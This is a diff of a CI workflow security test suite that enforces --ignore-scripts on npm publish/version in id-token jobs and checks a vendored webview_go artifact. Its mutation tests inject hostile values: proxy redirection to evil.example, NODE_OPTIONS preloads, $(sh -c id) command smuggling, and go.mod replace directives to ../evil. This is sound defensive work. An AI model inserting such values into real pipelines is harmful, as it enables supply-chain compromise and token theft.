@@ -87,6 +87,16 @@
 #      as listed, no write by redirection but to /dev/null, $GITHUB_OUTPUT
 #      or another descriptor, and the list is exactly what the jobs run. A
 #      job holding id-token with no list fails. See runAllow.
+#  10. (#1046) In a job holding id-token, npm version and a directory npm
+#      publish carry --ignore-scripts, never turned off again (lifecycle
+#      scripts run otherwise), npm version carries --workspaces=false, and no
+#      option comes before the npm command; publish-sidecar refuses, before
+#      it sets up or runs npm, a .npmrc anywhere in its checkout, a
+#      sidecar/npm that is not exactly the committed files (no link), and a
+#      package.json with a field beyond its list or another name; Prepare
+#      checks each package directory again where npm runs; both steps are
+#      executed against hostile fixtures, setup-node never restores the npm
+#      cache where authority is held, and the repository holds no .npmrc.
 #
 # Each rule is also run against a mutated copy that breaks it, and must report
 # it, so a neutered check fails here instead of passing everything.
@@ -410,9 +420,11 @@ if (rule === "runs") {
   // inputs, which the scripts check before use, #684, #781) and from the
   // runner reach the listed forms as they come; a redirection to
   // "$GITHUB_OUTPUT" is matched as that text, which holds because narrow
-  // refuses any GITHUB_* name being set; and npm runs lifecycle scripts of
-  // the package.json in a directory it publishes or versions
-  // (publish-sidecar), which is repository content, not run: text.
+  // refuses any GITHUB_* name being set. npm would run the lifecycle scripts
+  // of the package.json in a directory it publishes or versions
+  // (publish-sidecar), which is repository content, not run: text: narrow
+  // requires --ignore-scripts on those calls, and publish-sidecar refuses a
+  // .npmrc or a package.json field beyond its list before npm runs (#1046).
   const runAllow = {
     "publish-brain": {
       free: ["[", "base64", "echo", "exit", "sha256sum"],
@@ -449,7 +461,7 @@ if (rule === "runs") {
       ],
     },
     "publish-sidecar": {
-      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "true"],
+      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "tr", "true"],
       pinned: {
         cd: [
           "cd \"$GITHUB_WORKSPACE\"",
@@ -479,11 +491,20 @@ if (rule === "runs") {
         find: [
           "find \"${tmp}/x\" -mindepth 1 -maxdepth 1 -printf \x27%P %y\\n\x27",
           "find . -mindepth 1 -not -type d",
+          "find . -name .npmrc -print -quit",
+          "find \"${pkg_dir}\" -mindepth 1 -maxdepth 1 -printf \x27%y %f\\n\x27",
+          "find sidecar/npm -mindepth 1 -printf \x27%y %P\\n\x27",
           "find . -mindepth 1 -not -type d -not -type f -print -quit",
           "find . -mindepth 1 -not -type d -printf \x27%y %P\\n\x27",
           "find . -name \x27*[![:print:]]*\x27 -print -quit",
           "find . -type f -print0",
           "find bin -type f -print -quit",
+        ],
+        jq: [
+          "jq -e \x27type == \"object\" and (keys - [\"bin\", \"description\", \"files\", \"name\", \"optionalDependencies\", \"repository\", \"version\"] == []) and .name == \"@usejarvis/sidecar\" and .files == [\"bin\"] and .bin == {\"jarvis\": \"bin/jarvis\"} and (.optionalDependencies | type == \"object\" and keys == [\"@usejarvis/sidecar-darwin-arm64\", \"@usejarvis/sidecar-darwin-x64\", \"@usejarvis/sidecar-linux-arm64\", \"@usejarvis/sidecar-linux-x64\", \"@usejarvis/sidecar-win32-x64\"] and all(.[]; type == \"string\" and test(\"\\\\A[0-9]+\\\\.[0-9]+\\\\.[0-9]+\\\\z\")))\x27 sidecar/npm/jarvis-sidecar/package.json",
+          "jq -e --arg v \"$VERSION\" \x27[.optionalDependencies[]] | length == 5 and all(. == $v)\x27 package.json",
+          "jq -e --arg name \"@usejarvis/sidecar-${platform}\" \x27type == \"object\" and (keys - [\"cpu\", \"description\", \"files\", \"name\", \"os\", \"repository\", \"version\"] == []) and .name == $name and .files == [\"bin\"]\x27 \"${pkg_dir}/package.json\"",
+          "jq -e --arg name \"@usejarvis/sidecar-${platform}\" \x27type == \"object\" and (keys - [\"cpu\", \"description\", \"files\", \"name\", \"os\", \"repository\", \"version\"] == []) and .name == $name and .files == [\"bin\"]\x27 \"sidecar/npm/${platform}/package.json\"",
         ],
         local: [
           "local url integrity tmp got names types ours theirs",
@@ -496,8 +517,8 @@ if (rule === "runs") {
         npm: [
           "npm --version",
           "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
-          "npm publish --access public \"${flags[@]}\"",
-          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version",
+          "npm publish --access public --ignore-scripts \"${flags[@]}\"",
+          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version --ignore-scripts --workspaces=false",
           "npm view \"${1}@${VERSION}\" dist.integrity",
           "npm view \"${1}@${VERSION}\" dist.tarball",
           "npm view \"${pkg}@${VERSION}\" version",
@@ -574,6 +595,7 @@ if (rule === "runs") {
         "same=0",
         "sums=\"$(cd artifacts && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | base64 -w0)\"",
         "theirs=\"$(manifest \"${tmp}/x/package\")\"",
+        "tree=\"$(find sidecar/npm -mindepth 1 -printf \x27%y %P\\n\x27 | LC_ALL=C sort | tr \x27\\n\x27 \x27 \x27)\"",
         "tmp=\"$(mktemp -d)\"",
         "types=\"$(tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\" | cut -c1)\"",
         "url=\"$(npm view \"${1}@${VERSION}\" dist.tarball)\"",
@@ -1028,6 +1050,10 @@ if (rule === "mutable") {
         out.push(label + ": setup-bun without no-cache: true restores Bun from the Actions cache");
       if (/^actions\/cache(\/restore)?@/.test(uses))
         out.push(label + ": restores from the Actions cache (writable by any run on main)");
+      // setup-node turns on its npm cache when package.json names npm as
+      // packageManager, unless told not to (#1046 review).
+      if (uses.startsWith("actions/setup-node@") && (String(s.with?.["package-manager-cache"]) !== "false" || s.with?.cache !== undefined))
+        out.push(label + ": setup-node without package-manager-cache: false, or with cache:, restores from the Actions cache");
       if (uses.startsWith("actions/setup-go@") && String(s.with?.cache) !== "false")
         out.push(label + ": setup-go without cache: false restores modules and build output from the Actions cache");
       if (uses.startsWith("docker/setup-qemu-action@")) {
@@ -1189,6 +1215,52 @@ if (rule === "narrow") {
         if (cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|python3?|perl|ruby|deno|go)\\b").test(line) ||
             (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))) || globalOther(line))
           out.push(name + ": publishes with id-token and runs: " + line);
+      // #1046: npm version and a directory npm publish run the lifecycle
+      // scripts of the package.json they act on (preversion, version,
+      // postversion, prepublishOnly, prepack, prepare, postpack, publish,
+      // postpublish: all nine ran on npm 12.1.0 without the flag, none with
+      // it), so each carries --ignore-scripts. A publish of a .tgz path runs
+      // none (measured too), which is the publish-brain shape. npm takes any
+      // unambiguous abbreviation of a command (npm vers, npm publi) and the
+      // alias verison, so a verb is counted when it starts either word.
+      // runAllow pins the exact forms as well; this says why.
+      const npmVerb = new RegExp(cmd("npm(?:\\s+-\\S+)*\\s+([A-Za-z-]+)").source, "g");
+      for (const line of lines)
+        for (const m of line.matchAll(npmVerb)) {
+          const v = m[1].toLowerCase();
+          // From the npm word to the end of that command. A relative path
+          // ending in npm (find sidecar/npm ...) is an argument that cmd
+          // happens to match, not a program: a program is npm or a path
+          // from / or ./ (the same reading as the rest of this rule).
+          const at = m.index + m[0].lastIndexOf("npm");
+          const word = m[0].slice(0, m[0].lastIndexOf("npm")).split(/[\s"$(`=]/).pop();
+          if (word !== "" && !/^\.?\//.test(word)) continue;
+          const seg = line.slice(at).split(/[|;&)]/)[0];
+          // An option before the verb hides it from this rule (npm
+          // --loglevel warn publish reads warn as the verb), so only
+          // npm --version goes that way (security review of #1046).
+          if (/^npm\s+-/.test(seg) && !/^npm\s+--version\s*$/.test(seg)) {
+            out.push(name + ": runs npm with an option before its command, which this rule does not read (#1046): " + line);
+            continue;
+          }
+          if (v.length < 2 || !["version", "verison", "publish"].some((w) => w.startsWith(v))) continue;
+          // npm reads the last of these, and a value after the flag or a
+          // --no- form turns it off (measured on npm 12.1.0).
+          // npm expands any unique prefix of an option, so every option
+          // that could expand to ignore-scripts, negated or given a value,
+          // is refused but the exact --ignore-scripts. A program run by a
+          // relative path (bin/npm) is not read here; runAllow pins every
+          // npm form, and refuses any command name that is a path, for that.
+          const igs = [...seg.matchAll(/(?:^|\s)(--(?:no-)?ig[^\s=]*)(=\S*|\s+(?:true|false)\b)?/g)];
+          if (igs.some((g) => g[1] !== "--ignore-scripts" || g[2] !== undefined))
+            out.push(name + ": runs npm " + m[1] + " with --ignore-scripts given a value or negated (#1046): " + line);
+          const isVersion = ["version", "verison"].some((w) => w.startsWith(v));
+          if (isVersion && !/(?:^|\s)--workspaces=false(?=\s|$)/.test(seg))
+            out.push(name + ": runs npm " + m[1] + " without --workspaces=false, which installs a workspace root above the package with id-token in reach (#1046): " + line);
+          if (/(?:^|\s)--ignore-scripts(?=\s|$)/.test(seg)) continue;
+          if (/\bnpm\s+publish\s+"[^"]*\.tgz"/.test(seg.replace(/\$\{TARBALL\}/g, "x.tgz"))) continue;
+          out.push(name + ": runs npm " + m[1] + " without --ignore-scripts, which runs package.json lifecycle scripts with id-token in reach (#1046): " + line);
+        }
     }
     // #999: in a job holding id-token, no env names code to run before or
     // inside the steps. BASH_ENV and ENV name a file the shell sources
@@ -2588,6 +2660,15 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 	fi
 	expect_caught 'Bun restored from the Actions cache' mutable "$WORKFLOWS/release.yml" \
 		$'          no-cache: true\n' ''
+	expect_caught 'the npm cache of setup-node left on in the job holding id-token (#1046 review)' mutable "$WORKFLOWS/sidecar-release.yml" \
+		$'          package-manager-cache: false\n' '' \
+		'setup-node without package-manager-cache: false'
+	expect_caught 'the npm cache of setup-node left on in pack-brain (#1046 review)' mutable "$WORKFLOWS/release-exec.yml" \
+		$'          package-manager-cache: false\n' '' \
+		'setup-node without package-manager-cache: false'
+	expect_caught 'setup-node asked for an npm cache by name (#1046 review)' mutable "$WORKFLOWS/sidecar-release.yml" \
+		$'          package-manager-cache: false\n' $'          package-manager-cache: false\n          cache: npm\n' \
+		'or with cache:'
 	expect_caught 'Go modules and build output restored from the Actions cache' mutable "$WORKFLOWS/sidecar-release.yml" \
 		$'          cache: false\n' ''
 }
@@ -2612,6 +2693,52 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 		'uses actions/checkout@'
 	expect_caught 'a directory npm publish (runs lifecycle scripts)' narrow "$WORKFLOWS/release-exec.yml" \
 		'npm publish "${RUNNER_TEMP}/brain-pack/${TARBALL}" --access public' 'npm publish --access public'
+	# #1046: each npm call that acts on a package directory in the job
+	# holding id-token, with --ignore-scripts dropped.
+	expect_caught 'a platform npm version that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm version "${VERSION}" --no-git-tag-version --allow-same-version' \
+		'publish-sidecar: runs npm version without --ignore-scripts'
+	expect_caught 'the wrapper npm version that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'\n          npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts --workspaces=false\n' $'\n          npm version "${VERSION}" --no-git-tag-version --allow-same-version --workspaces=false\n' \
+		'publish-sidecar: runs npm version without --ignore-scripts'
+	expect_caught 'a platform directory npm publish that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public "${flags[@]}"' \
+		'publish-sidecar: runs npm publish without --ignore-scripts'
+	expect_caught 'the wrapper directory npm publish that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'\n          npm publish --access public --ignore-scripts "${flags[@]}"' $'\n          npm publish --access public "${flags[@]}"' \
+		'publish-sidecar: runs npm publish without --ignore-scripts'
+	expect_caught 'npm version by an abbreviation, without --ignore-scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm vers "${VERSION}" --no-git-tag-version --allow-same-version' \
+		'publish-sidecar: runs npm vers without --ignore-scripts'
+	expect_caught 'the npm version alias verison, without --ignore-scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            cd x && npm verison "${VERSION}" --no-git-tag-version' \
+		'publish-sidecar: runs npm verison without --ignore-scripts'
+	# Security review of #1046: the flag turned off again, an option that
+	# hides the verb, and the workspace walk of npm version.
+	expect_caught 'npm publish with --ignore-scripts false (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts false "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with --ignore-scripts then --no-ignore-scripts (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ignore-scripts "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with an abbreviated --no-ignore-script (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ignore-script "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with a short --no-ign (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ign "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with --ignore-script=false after the flag (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --ignore-script=false "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm version with --ignore-scripts=false (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts=false' \
+		'publish-sidecar: runs npm version with --ignore-scripts given a value or negated'
+	expect_caught 'an option with a value before the npm verb (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm --loglevel warn publish --access public "${flags[@]}"' \
+		'publish-sidecar: runs npm with an option before its command'
+	expect_caught 'npm version walking up to a workspace root (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'--allow-same-version --ignore-scripts --workspaces=false' '--allow-same-version --ignore-scripts' \
+		'publish-sidecar: runs npm version without --workspaces=false'
 	expect_caught 'the digest check removed before the publish' narrow "$WORKFLOWS/release-exec.yml" \
 		'brain-pack/${TARBALL}" | sha256sum -c -' 'brain-pack/${TARBALL}" | cat'
 	expect_caught 'another global package installed in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
@@ -3004,7 +3131,7 @@ echo "no env in a job holding id-token names code to run first, and no step writ
 		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          export HTTPS_PROXY=http://proxy.evil.example:3128\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
 		'publish-brain: step Publish to npm sets HTTPS_PROXY in its script, in a job holding id-token'
 	expect_caught 'NODE_OPTIONS in front of the publish command (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
-		'            npm publish --access public "${flags[@]}" 2>&1 | tee "$err"' '            NODE_OPTIONS=--require=/tmp/x.js npm publish --access public "${flags[@]}" 2>&1 | tee "$err"' \
+		'            npm publish --access public --ignore-scripts "${flags[@]}" 2>&1 | tee "$err"' '            NODE_OPTIONS=--require=/tmp/x.js npm publish --access public --ignore-scripts "${flags[@]}" 2>&1 | tee "$err"' \
 		'publish-sidecar: step Publish platform packages sets NODE_OPTIONS in its script, in a job holding id-token'
 	expect_caught 'a relative TMPDIR for the npm publish job (#1000 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
 		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      TMPDIR: git+https:/evil.example/r\n    # Same requirement' \
@@ -3140,10 +3267,10 @@ done
 		'      - name: Record artifact digests' $'      - run: printf -v PATH %s /tmp/evil\n      - name: Record artifact digests' \
 		'runs printf -v, which sets a variable this rule cannot see'
 	expect_caught 'a directory outside sidecar/npm in the platform loop (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
-		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		$'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' $'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' \
 		'publish-sidecar: step Prepare platform packages loops over platform in ../../../evil darwin-arm64'
 	expect_caught 'a command inside a for list (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
-		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		$'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' $'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' \
 		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
 	expect_caught 'a command inside a case pattern (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
 		'              darwin-*)' '              darwin-*|$(sh -c id))' \
@@ -3538,6 +3665,21 @@ const scripts = [
   [
     "set -euo pipefail",
     "in=\"$RUNNER_TEMP/webview-bump\"",
+    "files=\"$(find \"$in\" -type f | wc -l)\"",
+    "dirs=\"$(find \"$in\" -type d | wc -l)\"",
+    "if [ \"$files\" -gt 100 ] || [ \"$dirs\" -gt 50 ]; then",
+    "echo \"::error::the webview-bump artifact holds more than 100 files or 50 directories (#1049)\"",
+    "exit 1",
+    "fi",
+    "sizes=\"$(find \"$in\" -type f -printf \x27%s\\n\x27)\"",
+    "bytes=0",
+    "while read -r size; do",
+    "bytes=$((bytes + size))",
+    "done <<<\"$sizes\"",
+    "if [ \"$bytes\" -gt 8388608 ]; then",
+    "echo \"::error::the webview-bump artifact holds more than 8 MiB (#1049)\"",
+    "exit 1",
+    "fi",
     "if [ -n \"$(find \"$in\" -mindepth 1 -not -type f -not -type d -print -quit)\" ]; then",
     "echo \"::error::the webview-bump artifact holds something other than files and directories\"",
     "exit 1",
@@ -3556,6 +3698,58 @@ const scripts = [
     "fi",
     "if [ \"$(cat \"$in/webview_go/UPSTREAM_VERSION\" 2>/dev/null)\" != \"$VERSION\" ]; then",
     "echo \"::error::the vendored tree records another version than ${VERSION}\"",
+    "exit 1",
+    "fi",
+    "top=\"$(find \"$in/webview_go\" -mindepth 1 -maxdepth 1 -printf \x27%y %f\\n\x27)\"",
+    "libs=\"$(find \"$in/webview_go\" -mindepth 2 -type f -printf \x27%P\\n\x27)\"",
+    "while read -r kind name; do",
+    "case \"$kind $name\" in",
+    "\"d libs\" | \"f go.mod\" | \"f go.sum\" | \"f UPSTREAM_VERSION\" | \"f JARVIS_PATCH.md\" | \"f jarvis.patch\" | \"f .gitattributes\" | \"f LICENSE\") ;;",
+    "\"f \"*_test.go) echo \"::error::the vendored tree holds ${name}, a test file vendor-webview.sh does not copy (#1049)\"; exit 1 ;;",
+    "\"f \"*.go | \"f \"*.cc | \"f \"*.c | \"f \"*.h) ;;",
+    "*) echo \"::error::the vendored tree holds ${name}, which vendor-webview.sh does not copy (#1049)\"; exit 1 ;;",
+    "esac",
+    "done <<<\"$top\"",
+    "while read -r name; do",
+    "case \"$name\" in",
+    "\"\" | libs/*_test.go) [ -z \"$name\" ] || { echo \"::error::the vendored tree holds ${name}, a test file (#1049)\"; exit 1; } ;;",
+    "libs/*.h | libs/*.go | libs/*.txt | libs/*/LICENSE) ;;",
+    "*) echo \"::error::the vendored tree holds ${name}, which is not a header, Go file, text or license under libs/ (#1049)\"; exit 1 ;;",
+    "esac",
+    "done <<<\"$libs\"",
+    "for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do",
+    "if ! cmp -s \"$in/webview_go/$f\" \"sidecar/third_party/webview_go/$f\"; then",
+    "echo \"::error::the bump changes ${f}, which vendor-webview.sh keeps from main (#1049)\"",
+    "exit 1",
+    "fi",
+    "done",
+    "if [ -n \"$(find \"$in/webview_go\" -mindepth 2 -iname \x27.git*\x27 -print -quit)\" ]; then",
+    "echo \"::error::the vendored tree holds a .git file below its top, such as a .gitattributes (#1049)\"",
+    "exit 1",
+    "fi",
+    "if ! cmp -s \"$in/go.sum\" sidecar/go.sum; then",
+    "echo \"::error::the bumped sidecar/go.sum differs from main (#1049)\"",
+    "exit 1",
+    "fi",
+    "if [ ! -f \"$in/webview_go/go.mod\" ]; then",
+    "echo \"::error::the vendored tree holds no go.mod (#1049)\"",
+    "exit 1",
+    "fi",
+    "directives() {",
+    "awk \x27{ sub(/\\/\\/.*/, \"\") } NF == 0 { next } { $1 = $1 } $0 == \")\" { block = \"\"; next } NF == 2 && $2 == \"(\" { block = $1; next } block != \"\" { print block \" \" $0; next } { print }\x27 \"$1\" | LC_ALL=C sort",
+    "}",
+    "main_mod=\"$(directives sidecar/go.mod)\"",
+    "new_mod=\"$(directives \"$in/go.mod\")\"",
+    "if [ \"$new_mod\" != \"$main_mod\" ]; then",
+    "echo \"::error::the bumped sidecar/go.mod differs from main in its directives (#1049):\"",
+    "diff <(printf \x27%s\\n\x27 \"$main_mod\") <(printf \x27%s\\n\x27 \"$new_mod\") | cat -v || true",
+    "exit 1",
+    "fi",
+    "main_mod=\"$(directives sidecar/third_party/webview_go/go.mod | awk \x27$1 != \"go\" && $1 != \"require\"\x27)\"",
+    "new_mod=\"$(directives \"$in/webview_go/go.mod\" | awk \x27$1 != \"go\" && $1 != \"require\"\x27)\"",
+    "if [ \"$new_mod\" != \"$main_mod\" ]; then",
+    "echo \"::error::the vendored go.mod differs from main in a directive other than go and require (#1049):\"",
+    "diff <(printf \x27%s\\n\x27 \"$main_mod\") <(printf \x27%s\\n\x27 \"$new_mod\") | cat -v || true",
     "exit 1",
     "fi",
     "rm -rf sidecar/third_party/webview_go",
@@ -3706,20 +3900,30 @@ const st = (d.jobs?.publish?.steps ?? []).find((s) => s.name === "Put the vendor
 if (!st || typeof st.run !== "string") process.exit(2);
 process.stdout.write(st.run);
 ')" || COPY_STEP=""
+REAL_SIDECAR="${HERE}/../../sidecar"
 # copy_case <label> <ok|refused> <shell run in the artifact dir to shape it>
 copy_case() {
 	local label="$1" want="$2" shape="$3" d="${WORK}/wvcopy"
 	rm -rf "$d" && mkdir -p "$d/ws/sidecar/third_party/webview_go/libs" "$d/tmp/webview-bump/webview_go/libs/webview"
 	printf 'old\n' >"$d/ws/sidecar/third_party/webview_go/dropped.go"
-	printf 'old attrs\n' >"$d/ws/sidecar/third_party/webview_go/.gitattributes"
-	printf 'module old\n' >"$d/ws/sidecar/go.mod"
-	printf 'old sum\n' >"$d/ws/sidecar/go.sum"
+	# The files vendor-webview.sh keeps, as main has them, on both sides.
+	for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do
+		cp "$REAL_SIDECAR/third_party/webview_go/$f" "$d/ws/sidecar/third_party/webview_go/$f"
+		cp "$REAL_SIDECAR/third_party/webview_go/$f" "$d/tmp/webview-bump/webview_go/$f"
+	done
+	# The module files as main has them (#1049): the step compares the
+	# artifact with these, directive for directive.
+	cp "$REAL_SIDECAR/go.mod" "$d/ws/sidecar/go.mod"
+	cp "$REAL_SIDECAR/third_party/webview_go/go.mod" "$d/ws/sidecar/third_party/webview_go/go.mod"
+	cp "$REAL_SIDECAR/go.sum" "$d/ws/sidecar/go.sum"
 	printf 'package webview\n' >"$d/tmp/webview-bump/webview_go/webview.go"
-	printf '* -text\n' >"$d/tmp/webview-bump/webview_go/.gitattributes"
 	printf 'v1.2.3\n' >"$d/tmp/webview-bump/webview_go/UPSTREAM_VERSION"
 	printf 'header\n' >"$d/tmp/webview-bump/webview_go/libs/webview/webview.h"
-	printf 'module new\n' >"$d/tmp/webview-bump/go.mod"
-	printf 'new sum\n' >"$d/tmp/webview-bump/go.sum"
+	cp "$REAL_SIDECAR/third_party/webview_go/go.mod" "$d/tmp/webview-bump/webview_go/go.mod"
+	# Same directives, written differently (a comment, spacing), so the
+	# accepted copy still shows go.mod is replaced.
+	{ printf '// go mod tidy\n'; sed 's/^go \(.*\)$/go   \1   \/\/ toolchain line/' "$REAL_SIDECAR/go.mod"; } >"$d/tmp/webview-bump/go.mod"
+	cp "$REAL_SIDECAR/go.sum" "$d/tmp/webview-bump/go.sum"
 	(cd "$d/tmp/webview-bump" && eval "$shape") || {
 		no "webview copy: ${label} (the fixture could not be shaped)"
 		return
@@ -3733,6 +3937,11 @@ copy_case() {
 		cmp -s "$d/tmp/webview-bump/go.mod" "$d/ws/sidecar/go.mod" && cmp -s "$d/tmp/webview-bump/go.sum" "$d/ws/sidecar/go.sum" && ok_=1 ;;
 	refused) [ "$rc" -ne 0 ] && grep -q '^::error::' "$d/log" && diff -r "$d/before" "$d/ws" >/dev/null && ok_=1 ;;
 	esac
+	# A #1049 case is refused by a #1049 check, or by the one it names,
+	# not by whatever else happens to fail (security review of #1049).
+	local reason="${4:-}"
+	[ -z "$reason" ] && [[ "$label" == *"(#1049"* ]] && reason="(#1049)"
+	if [ "$want" = refused ] && [ -n "$reason" ] && ! grep -qF -- "$reason" "$d/log"; then ok_=0; fi
 	if [ "$ok_" = 1 ]; then ok "webview copy: ${label}"; else no "webview copy: ${label}" "exit ${rc}; log: $(cat "$d/log")"; fi
 }
 if [ -z "$COPY_STEP" ]; then
@@ -3752,6 +3961,52 @@ else
 	copy_case 'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
 	copy_case 'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
 	copy_case 'a tree recording no version is refused' refused 'rm webview_go/UPSTREAM_VERSION'
+	# #1049: the content of the artifact, not only its shape.
+	copy_case 'the committed vendor tree, as a re-vendor of the pinned version gives it, is accepted (#1049)' ok \
+		'rm -r webview_go && cp -R "$REAL_SIDECAR/third_party/webview_go" webview_go && printf "v1.2.3\n" >webview_go/UPSTREAM_VERSION && cp "$REAL_SIDECAR/go.mod" "$REAL_SIDECAR/go.sum" .'
+	copy_case 'a new replace in sidecar/go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>go.mod'
+	copy_case 'a new replace inside a block is refused (#1049)' refused 'printf "replace (\n\tgolang.org/x/sys => ../evil\n)\n" >>go.mod'
+	copy_case 'the existing replace pointed elsewhere is refused (#1049)' refused 'sed -i "s|=> ./third_party/webview_go|=> ../evil|" go.mod'
+	copy_case 'a toolchain directive is refused (#1049)' refused 'printf "toolchain go1.99.0\n" >>go.mod'
+	copy_case 'a tool directive is refused (#1049)' refused 'printf "tool evil.example/x\n" >>go.mod'
+	copy_case 'a godebug directive is refused (#1049)' refused 'printf "godebug x509sha1=1\n" >>go.mod'
+	copy_case 'a moved go directive is refused (#1049)' refused 'sed -i "s/^go   .*/go 1.99.0/" go.mod'
+	copy_case 'a require block turned into an exclude block is refused (#1049)' refused 'sed -i "s/^require (/exclude (/" go.mod && grep -q "^exclude (" go.mod'
+	copy_case 'a new require is refused (#1049)' refused 'printf "require evil.example/x v1.0.0\n" >>go.mod'
+	copy_case 'a require moved to another version inside the block is refused (#1049)' refused 'sed -i "s|golang.org/x/sys v[0-9.]*|golang.org/x/sys v0.1.0|" go.mod && grep -q "x/sys v0.1.0" go.mod'
+	copy_case 'a replace in the vendored go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>webview_go/go.mod'
+	copy_case 'a vendored tree with no go.mod is refused (#1049)' refused 'rm webview_go/go.mod' 'holds no go.mod'
+	copy_case 'a vendored go.mod with no module line is refused (#1049)' refused 'sed -i "/^module/d" webview_go/go.mod' 'the vendored go.mod differs'
+	copy_case 'a vendored go.mod moving its own go line is accepted (#1049)' ok 'sed -i "s/^go .*/go 1.21/" webview_go/go.mod'
+	copy_case 'a build script at the top of the vendored tree is refused (#1049)' refused 'printf "#!/bin/sh\n" >webview_go/build.sh'
+	copy_case 'a test file at the top of the vendored tree is refused (#1049)' refused 'printf "package webview\n" >webview_go/webview_test.go'
+	copy_case 'an upstream README at the top of the vendored tree is refused (#1049)' refused 'printf x >webview_go/README.md'
+	copy_case 'a directory other than libs at the top of the vendored tree is refused (#1049)' refused 'mkdir webview_go/examples && printf x >webview_go/examples/main.go'
+	copy_case 'a new C source is accepted (#1049)' ok 'printf "int x;\n" >webview_go/extra.c'
+	copy_case 'a license under another name is for a person to take (#1049 review)' refused 'printf x >webview_go/LICENSE-THIRD-PARTY' 'holds LICENSE-THIRD-PARTY'
+	# Security review of #1049: built files under a license name, files
+	# the script keeps, hidden diffs, go.sum, directories, a carriage return,
+	# and go.mod spellings the normaliser must not read as main.
+	copy_case 'a LICENSE.syso, which Go links by its extension, is refused (#1049 review)' refused 'printf x >webview_go/LICENSE.syso' 'holds LICENSE.syso'
